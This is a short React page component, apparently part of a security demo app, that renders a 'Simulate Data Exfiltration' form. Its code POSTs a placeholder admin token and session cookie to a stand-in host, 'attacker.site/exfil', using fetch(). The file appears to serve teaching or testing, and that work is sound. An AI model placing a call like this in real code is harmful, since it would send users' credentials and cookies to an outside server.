// 📁 frontend/src/pages/Exfiltration.js
import React, { useState } from "react";

export default function Exfiltration() {
  const [target, setTarget] = useState("http://attacker.site/exfil");
  const [data, setData] = useState("token=admin123&cookies=PHPSESSID=abc123");

  const sendData = () => {
    fetch(target, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: data,
    });
    alert("Data sent to attacker server!");
  };

  return (
    <div>
      <h2>Simulate Data Exfiltration</h2>
      <input value={target} onChange={(e) => setTarget(e.target.value)} placeholder="Attacker URL" />
      <textarea value={data} onChange={(e) => setData(e.target.value)} rows="5" />
      <button onClick={sendData}>Send Data</button>
    </div>
  );
}